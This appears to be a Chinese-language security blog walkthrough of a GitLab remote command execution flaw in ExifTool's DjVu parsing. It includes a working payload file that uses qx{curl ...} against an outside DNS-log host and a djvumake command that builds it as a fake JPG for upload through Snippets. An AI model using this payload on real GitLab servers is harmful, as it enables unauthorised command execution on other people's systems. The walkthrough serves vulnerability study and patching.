## 漏洞简介

GitLab是美国GitLab公司的一款使用Ruby on Rails开发的、自托管的、Git（版本控制系统）项目仓库应用程序。 由于 GitLab
没有正确验证传递给文件解析器的图像文件，攻击者可利用该漏洞在服务端进行远程命令执行。

## 漏洞分析

当上传图片文件时，需要上传`DjVu`格式图片,`Gitlab
Workhorse`将扩展名为`jpg|jpeg|tiff`的文件通过`ExifTool`删除任何非白名单标记。

其中一个支持的格式是`DjVu`。当解析`DjVu`注释时，标记被赋值为convert C escape sequences,进行解析。``

## 漏洞利用

工具下载地址：https://launchpad.net/ubuntu/+source/djvulibr

![1635501105_617bc4315d79bfb32aba0.png!small?1635501162975](https://image.3001.net/images/20211029/1635501105_617bc4315d79bfb32aba0.png!small?1635501162975)

![1635501138_617bc45222df72c8f7941.png!small?1635501195910](https://image.3001.net/images/20211029/1635501138_617bc45222df72c8f7941.png!small?1635501195910)

`首先在Gitlab平台的注册一个账户及密码```

``

`![1635501161_617bc4698aba098d338b3.png!small?1635501219143](https://image.3001.net/images/20211029/1635501161_617bc4698aba098d338b3.png!small?1635501219143)``登录后到个人主页，找到Snippets`

``

``

`![1635501185_617bc4815f1ac432fe6b7.png!small?1635501242938](https://image.3001.net/images/20211029/1635501185_617bc4815f1ac432fe6b7.png!small?1635501242938)``![1635501207_617bc4973e3f648e70da5.png!small?1635501264860](https://image.3001.net/images/20211029/1635501207_617bc4973e3f648e70da5.png!small?1635501264860)``此处需要上传DjVu格式图片（即Exp），找到漏洞点进行抓包：`

``

``

``![1635501248_617bc4c0a99df341b3093.png!small?1635501306266](https://image.3001.net/images/20211029/1635501248_617bc4c0a99df341b3093.png!small?1635501306266)![1635501261_617bc4cdbd5b5b76bb1e8.png!small?1635501319741](https://image.3001.net/images/20211029/1635501261_617bc4cdbd5b5b76bb1e8.png!small?1635501319741)```rce.txt文本内容：``(metadata  
(Copyright "\  
" . qx{curl ybit.anvr1c.dnslog.cn} . \  
" b ") )``使用djvulibre-bin_3.5.27.1-8ubuntu0.4_amd64.deb制作exp`

    
    
    执行命令：djvumake rce.djvu INFO=0,0 BGjp=/dev/null ANTa=rce.txt && mv rce.djvu rce.jpg 生成exp。  
  
---  
  
``

``

![1635501282_617bc4e2d63b810eac7e2.png!small?1635501340516](https://image.3001.net/images/20211029/1635501282_617bc4e2d63b810eac7e2.png!small?1635501340516)

`![1635501295_617bc4ef25e3625651aa9.png!small?1635501352953](https://image.3001.net/images/20211029/1635501295_617bc4ef25e3625651aa9.png!small?1635501352953)``上传exp：`![1635501310_617bc4fe220ed15df0041.png!small?1635501367747](https://image.3001.net/images/20211029/1635501310_617bc4fe220ed15df0041.png!small?1635501367747)

``

``

``

![1635501323_617bc50bbb9eec5f6f422.png!small?1635501381388](https://image.3001.net/images/20211029/1635501323_617bc50bbb9eec5f6f422.png!small?1635501381388)

![1635501337_617bc519a22baa4da37e6.png!small?1635501395717](https://image.3001.net/images/20211029/1635501337_617bc519a22baa4da37e6.png!small?1635501395717)

执行结果：![1635501347_617bc523e556a2162bc74.png!small?1635501405554](https://image.3001.net/images/20211029/1635501347_617bc523e556a2162bc74.png!small?1635501405554)

``

``

  

